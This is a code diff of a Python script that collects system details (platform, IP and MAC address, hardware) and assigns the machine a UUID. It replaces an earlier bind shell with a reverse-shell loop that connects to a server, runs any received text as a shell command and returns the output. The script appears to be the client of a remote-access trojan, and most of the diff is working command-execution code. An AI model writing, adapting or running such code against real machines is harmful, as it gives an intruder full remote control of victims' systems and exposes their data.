@@ -5,13 +5,26 @@ import uuid
 import os
 import socket
 import time
+import random
+from Payload import encryption
+
+
+
 # get the basic information of the software
 report = open("report.txt", "w+")
-
 id = open("id.txt", "a+")
+
 if os.stat("id.txt").st_size == 0:
     id.write(str(uuid.uuid4()))
+    port_attr = open("port_attr.txt", "w+")
+
+    port_attr.write(str(random.randint(100, 65535)))
+    port_attr.close()
+    key = encryption.generate_key()
+    uuid = id.read()
+    first_launch = True
 else:
+    uuid = id.read()
     first_launch = False
 
 platform = plat.platform()
@@ -75,43 +88,25 @@ if system == "Linux":
         pass
 report.close()
 # sending the datas to the server
+attr_port_file = open("port_attr.txt", "r")
+attr = attr_port_file.read()
+s = socket.socket()
+host = '127.0.0.1'
+port = int(attr)
 
+s.connect((host, port))
 
-HOST = "127.0.0.1"
-PORT = 5566
-if first_launch:
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        id_file = open("id.txt")
-        id = id_file.read()
-        req = cur = f"('{id}', '{computer_name}', '{ip_addr}', '{mac_addr}', '{platform}', '{system}', '{ver}', '{bits}', '{totcore}', '{maxfreq}', '{minfreq}', {ram_in_MB}, '{broadcast_ip}', '{netmask}', '{BROADCAST_MAC}');".encode()
-        print(req)
-        s.send(req)
-
-
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket.bind((ip_addr, 5566))
-socket.listen(5)
-client, address = socket.accept()
-print("{} connected".format(address))
 while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
 
-    sended = client.recv(255)
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
 
-    cmd = sended.decode()
-    if cmd == b'':
-        time.sleep(10)
-    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, )
+        print(output_str)
 
-    stdout, stderr = process.communicate()
-    if stderr is None:
-        stderr = ""
-    print(stdout, stderr)
-    try:
-        client.sendall(stdout)
-    except:
-        client.sendall(stderr)
-    finally:
-        client.sendall(str.encode("Command has returned any output"))
-
-    pass
